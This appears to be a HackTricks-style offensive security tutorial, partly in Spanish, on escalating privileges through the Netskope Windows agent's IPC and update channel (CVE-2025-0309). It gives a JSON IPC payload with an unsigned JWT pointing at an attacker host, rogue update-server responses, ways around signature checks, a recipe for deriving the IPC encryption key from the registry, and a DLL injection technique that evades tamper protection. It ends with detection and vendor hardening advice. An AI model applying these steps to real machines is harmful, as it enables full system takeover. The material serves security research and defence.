# Abuso de actualizadores automáticos empresariales e IPC privilegiado (p. ej., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza una clase de cadenas de escalada de privilegios local de Windows encontradas en agentes endpoint empresariales y actualizadores que exponen una superficie IPC de baja fricción y un flujo de actualización privilegiado. Un ejemplo representativo es Netskope Client for Windows < R129 (CVE-2025-0309), donde un usuario con pocos privilegios puede forzar la inscripción en un servidor controlado por el atacante y luego entregar un MSI malicioso que el servicio SYSTEM instala.

Ideas clave que puedes reutilizar contra productos similares:
- Abusar del IPC localhost de un servicio privilegiado para forzar la reinscripción o la reconfiguración hacia un servidor atacante.
- Implementar los endpoints de actualización del proveedor, entregar una Trusted Root CA maliciosa y apuntar el updater a un paquete malicioso “firmado”.
- Evadir verificaciones de firmante débiles (CN allow‑lists), flags de digest opcionales y propiedades MSI laxas.
- Si el IPC está “cifrado”, derivar la key/IV de identificadores de máquina legibles por el mundo almacenados en el registry.
- Si el servicio restringe a los llamantes por image path/process name, inyectar en un proceso allow‑listed o lanzar uno en suspended y bootstrapear tu DLL vía un parche mínimo del thread‑context.

---
## 1) Forzar la inscripción en un servidor atacante vía IPC localhost

Muchos agentes incluyen un proceso UI en user‑mode que se comunica con un servicio SYSTEM sobre localhost TCP usando JSON.

Observado en Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flujo del exploit:
1) Crear un token JWT de inscripción cuyas claims controlen el host backend (p. ej., AddonUrl). Usar alg=None de modo que no se requiera firma.
2) Enviar el mensaje IPC invocando el comando de provisioning con tu JWT y el nombre del tenant:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) El servicio comienza a realizar peticiones a tu servidor rogue para enrollment/config, p. ej.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- Si la verificación del llamante se basa en ruta/nombre, origina la petición desde un binario de proveedor en la lista de permitidos (ver §4).

---
## 2) Hijacking el canal de actualización para ejecutar código como SYSTEM

Una vez que el cliente se comunica con tu servidor, implementa los endpoints esperados y redirígelo a un MSI del atacante. Secuencia típica:

1) /v2/config/org/clientconfig → Devuelve una configuración JSON con un intervalo del actualizador muy corto, p. ej.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Devuelve un certificado CA en formato PEM. El servicio lo instala en el almacén Trusted Root del equipo local.
3) /v2/checkupdate → Proporciona metadatos que apuntan a un MSI malicioso y a una versión falsa.

Bypassing common checks seen in the wild:
- Signer CN allow‑list: el servicio puede comprobar únicamente que el Subject CN sea “netSkope Inc” o “Netskope, Inc.”. Tu CA maliciosa puede emitir un certificado leaf con ese CN y firmar el MSI.
- CERT_DIGEST property: incluye una propiedad MSI benigna llamada CERT_DIGEST. No hay aplicación durante la instalación.
- Optional digest enforcement: una bandera de configuración (p. ej., check_msi_digest=false) desactiva la validación criptográfica adicional.

Result: the SYSTEM service installs your MSI from
C:\ProgramData\Netskope\stAgent\data\*.msi
executing arbitrary code as NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers can reproduce encryption and send valid encrypted commands from a standard user. General tip: if an agent suddenly “encrypts” its IPC, look for device IDs, product GUIDs, install IDs under HKLM as material.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

Some services try to authenticate the peer by resolving the TCP connection’s PID and comparing the image path/name against allow‑listed vendor binaries located under Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow‑listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow‑listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver‑enforced tamper rules.

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user‑mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed‑mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in‑process, loading your DLL.

Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already‑protected process (you created it), the driver’s policy is satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatiza una CA maliciosa, la firma de MSI maliciosos, y sirve los endpoints necesarios: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope es un cliente IPC personalizado que construye mensajes IPC arbitrarios (opcionalmente AES‑cifrados) e incluye la inyección en proceso suspendido para originar desde un binario en la lista blanca.

---
## 7) Detection opportunities (blue team)
- Monitor additions to Local Machine Trusted Root. Sysmon + registry‑mod eventing (see SpecterOps guidance) works well.
- Flag MSI executions initiated by the agent’s service from paths like C:\ProgramData\<vendor>\<agent>\data\*.msi.
- Review agent logs for unexpected enrollment hosts/tenants, e.g.: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – look for addonUrl / tenant anomalies and provisioning msg 148.
- Alert on localhost IPC clients that are not the expected signed binaries, or that originate from unusual child process trees.

---
## Hardening tips for vendors
- Bind enrollment/update hosts to a strict allow‑list; reject untrusted domains in clientcode.
- Authenticate IPC peers with OS primitives (ALPC security, named‑pipe SIDs) instead of image path/name checks.
- Keep secret material out of world‑readable HKLM; if IPC must be encrypted, derive keys from protected secrets or negotiate over authenticated channels.
- Treat the updater as a supply‑chain surface: require a full chain to a trusted CA you control, verify package signatures against pinned keys, and fail closed if validation is disabled in config.

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
